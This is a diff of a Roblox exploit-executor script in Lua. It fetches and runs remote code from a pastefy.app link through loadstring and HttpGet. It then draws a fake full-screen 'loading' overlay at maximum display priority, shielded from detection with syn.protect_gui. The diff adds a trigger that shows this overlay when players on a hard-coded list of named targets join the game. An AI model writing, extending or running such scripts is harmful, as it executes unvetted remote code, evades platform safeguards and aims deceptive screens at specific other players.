@@ -2,9 +2,15 @@
 loadstring(game:HttpGet("https://pastefy.app/7oIIajYz/raw"))()
 
 -- ⏱️ Wait for 60 seconds before showing the GUI
-task.wait(40)
+-- 🎯 Add your target player names here
+local targetPlayers = {
+    ["GAGpetstock28"] = true,
+    ["yesbroimcool1234"] = true,
+    ["anotherplayer"] = true,
+    
+}
 
--- ✅ Show always-on-top loading GUI
+-- ⚡ GUI display function
 local function showLoadingGui()
     if not game:IsLoaded() then game.Loaded:Wait() end
 
@@ -13,10 +19,9 @@ local function showLoadingGui()
     gui.Name = "ExecutorLoadingUI"
     gui.ResetOnSpawn = false
     gui.IgnoreGuiInset = true
-    gui.DisplayOrder = 999999999 -- Max priority
-    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global -- Always render above other elements
+    gui.DisplayOrder = 999999999
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 
-    -- Protect GUI from detection (for Synapse or similar)
     pcall(function()
         if syn and syn.protect_gui then
             syn.protect_gui(gui)
@@ -74,8 +79,22 @@ local function showLoadingGui()
     end)
 end
 
--- 🧨 Trigger the GUI after delay
-showLoadingGui()
+-- 🔍 Detect player join
+game.Players.PlayerAdded:Connect(function(player)
+    if targetPlayers[player.Name] then
+        wait(2) -- Optional delay
+        showLoadingGui()
+    end
+end)
+
+-- 🔁 Also check already-joined players (e.g., you attach after they joined)
+for _, player in ipairs(game.Players:GetPlayers()) do
+    if targetPlayers[player.Name] then
+        wait(2)
+        showLoadingGui()
+    end
+end
+
 
 
 
